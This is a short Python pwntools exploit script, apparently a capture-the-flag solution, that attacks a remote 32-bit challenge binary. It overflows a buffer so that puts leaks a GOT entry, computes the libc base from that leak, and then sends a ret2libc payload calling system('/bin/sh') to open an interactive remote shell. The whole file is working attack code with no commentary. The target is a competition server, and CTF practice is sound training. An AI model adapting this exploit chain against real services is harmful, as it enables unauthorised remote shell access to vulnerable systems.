import struct

from pwn import *


def to_n(addr):
    return struct.unpack('I', addr)[0]


def to_addr(n):
    return struct.pack('I', n)


def main():
    libc = ELF('./libc.so.6')
    # libc  = ELF('/lib/i386-linux-gnu/libc-2.25.so')

    binsh = to_addr(list(libc.search('/bin/sh'))[0])

    fgets      = '\x3e\x85\x04\x08'
    puts_addr  = '\x03\x85\x04\x08'
    puts_got   = '\x74\x98\x04\x08'
    fflush_got = '\x68\x98\x04\x08'

    # pc = process('./vuln4')
    pc = remote('ctf.sharif.edu', 4801)

    pc.sendline(f'AAAAAAAAAAAAAAAAAA{puts_got}{puts_addr}{fflush_got}')

    print(repr(pc.recvline()))
    print(repr(pc.recvline()))

    libc_base = to_n(pc.recvline()[:4]) - libc.symbols['fflush']
    binsh     = to_addr(to_n(binsh) + libc_base)
    system    = to_addr(libc_base + libc.symbols['system'])

    print(f'System address:  {hex(to_n(system))}')
    print(f'/bin/sh address: {hex(to_n(binsh))}')

    pc.sendline(f'AAAAAAAAAAAAAAAAAAAAAA{system}BBBB{binsh}')

    pc.interactive()

if __name__ == '__main__':
    main()